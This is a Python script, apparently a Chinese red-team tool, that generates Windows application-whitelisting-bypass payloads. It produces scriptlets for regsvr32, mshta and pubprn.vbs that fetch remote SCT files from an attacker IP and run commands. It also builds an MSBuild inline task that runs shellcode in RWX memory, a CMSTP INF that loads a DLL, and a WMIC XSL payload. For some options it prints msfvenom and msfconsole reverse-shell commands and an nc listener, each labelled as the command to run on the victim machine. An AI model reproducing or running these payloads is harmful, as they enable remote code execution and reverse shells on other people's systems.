#@author:九世
#@file:create.py
#@time:2019/9/26

import sys

zz='需要在受害机执行的命令'
payload=['1.vbscript远程加载 [第二参数需要的是命令]','2.mshta远程调用 [第二参数需要的是命令]','3.MSBuild编译C# [第二参数需要的是shellcode,例如 byte xx[]={0x00}]',
         '4.regsvr32远程加载 [第二参数需要的是命令]','5.CPL加载(Control Panel Item) [第二参数随便输入即可]','6.CMSTP加载DLL [第二参数随便输入即可]','7.Forfiles拼接命令执行 [第二参数需要的是命令]'
         '8.使用WMIC和XSL执行 [第二参数需要的是命令]']

class Shen:
    def shen(self,xz,command):
        if xz=='1':
            print('[------->] 生成sct中')
            print('''<?XML version="1.0"?>
<scriptlet>

<registration
    description="Bandit"
    progid="Bandit"
    version="1.00"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"   
	>
</registration>

<script language="JScript">
<![CDATA[
		var r = new ActiveXObject("WScript.Shell").Run("'''+open(command,'r',encoding='utf-8').read()+'''");	
]]>
</script>

</scriptlet>
            ''',file=open('save.sct','a',encoding='utf-8'))
            print('{}:{}'.format(zz,'cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:http://<Your_IP>/<Sct_PATH>'))

        elif xz=='2':
            print('[------->] 生成sct中')
            print('''<?XML version="1.0"?>
<scriptlet>
<registration description="Desc" progid="Progid" version="0" classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"></registration>

<public>
    <method name="Exec"></method>
</public>

<script language="JScript">
<![CDATA[
	function Exec()	{
		var r = new ActiveXObject("WScript.Shell").Run("'''+open(command,'r',encoding='utf-8').read()+'''");
	}
]]>
</script>
</scriptlet>
            ''',file=open('save1.sct','a',encoding='utf-8'))
            print('{}:{}'.format(zz,'cmd /c mshta.exe javascript:a=(GetObject("script:http://<YOUR_IP>/<YOUR_SCT>")).Exec();close();'))


        elif xz=='3':
            print('[------->] 生成xml中')
            print('''<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
         <!-- This inline task executes shellcode. -->
         <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
         <!-- Save This File And Execute The Above Command -->
         <!-- Author: Casey Smith, Twitter: @subTee -->
         <!-- License: BSD 3-Clause -->
	  <Target Name="Hello">
	    <ClassExample />
	  </Target>
	  <UsingTask
	    TaskName="ClassExample"
	    TaskFactory="CodeTaskFactory"
	    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	    <Task>
	    
	      <Code Type="Class" Language="cs">
	      <![CDATA[
		using System;
		using System.Runtime.InteropServices;
		using Microsoft.Build.Framework;
		using Microsoft.Build.Utilities;
		public class ClassExample :  Task, ITask
		{         
		  private static UInt32 MEM_COMMIT = 0x1000;          
		  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
		  [DllImport("kernel32")]
		    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
		    UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
		  [DllImport("kernel32")]
		    private static extern IntPtr CreateThread(            
		    UInt32 lpThreadAttributes,
		    UInt32 dwStackSize,
		    UInt32 lpStartAddress,
		    IntPtr param,
		    UInt32 dwCreationFlags,
		    ref UInt32 lpThreadId           
		    );
		  [DllImport("kernel32")]
		    private static extern UInt32 WaitForSingleObject(           
		    IntPtr hHandle,
		    UInt32 dwMilliseconds
		    );          
		  public override bool Execute()
		  {
			//replace with your own shellcode
		    '''+open(command,'r',encoding='utf-8').read()+'''
		      
		      UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
			MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		      Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
		      IntPtr hThread = IntPtr.Zero;
		      UInt32 threadId = 0;
		      IntPtr pinfo = IntPtr.Zero;
		      hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
		      WaitForSingleObject(hThread, 0xFFFFFFFF);
		      return true;
		  } 
		}     
	      ]]>
	      </Code>
	    </Task>
	  </UsingTask>
	</Project>''',file=open('save2.xml','a',encoding='utf-8'))
            print('{}:{}'.format(zz,'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe <XML_PATH>'))

        elif xz=='4':
            print('[------->] 生成sct中')
            print('''<?XML version="1.0"?>
<scriptlet>
<registration
  progid="TESTING"
  classid="{A1112221-0000-0000-3000-000DA00DABFC}" >
  <script language="JScript">
    <![CDATA[
      var foo = new ActiveXObject("WScript.Shell").Run("'''+open(command,'r',encoding='utf-8').read()+'''"); 
    ]]>
</script>
</registration>
</scriptlet>''',file=open('save3.sct','a',encoding='utf-8'))
            print('{}:{}'.format(zz,'regsvr32.exe /s /i:http://<YOUR_IP>/<YOUR_SCT_PATH> scrobj.dll'))

        elif xz=='5':
            print('[------->] 生成命令中')
            print('在attack执行:msfconsole -x "use windows/local/cve_2017_8464_lnk_lpe;set payload windows/x64/shell_reverse_tcp;set lhost <attack_IP>;exploit"')
            print('在attack执行:nc -lvvp 4444')
            print('{}:{}'.format(zz,'control.exe <CPL_PATH>'))

        elif xz=='6':
            print('[------->] 生成命令中')
            print('在attack执行:msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll > <DLL_PATH>')
            print('[------->] 生成inf中')
            print('''[version]
Signature=$chicago$
AdvancedINF=2.5
 
[DefaultInstall_SingleUser]
RegisterOCXs=RegisterOCXSection
 
[RegisterOCXSection]
<DLL_PATH>
 
[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="mantvydas"
ShortSvcName="mantvydas"''',file=open('save4.inf','a',encoding='utf-8'))
            print('{}:{}'.format(zz,'cmstp.exe /s <INF_PATH>'))

        elif xz=='7':
            print('[------->] 生成命令中')
            print('forfiles /p c:\windows\system32 /m notepad.exe /c {}'.format(open(command,'r',encoding='utf-8').read()))

        elif xz=='8':
            print('[------->] 生成xsl中')
            print('''<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
	var r = new ActiveXObject("WScript.Shell").Run("'''+open(command,'r',encoding='utf-8').read()+'''");
	]]> </ms:script>
</stylesheet>''',file=open('save5.xsl','a',encoding='utf-8'))
            print('{}:{}'.format(zz,'wmic os get /FORMAT:"<XSL_PATH>"'))

if __name__ == '__main__':
    obj=Shen()
    try:
        obj.shen(sys.argv[1],sys.argv[2])
    except:
        print('[!] 选项')
        for c in payload:
            print(c)
        print('create.py [{}] [{}] '.format('选项','存放要执行的命令的txt'))
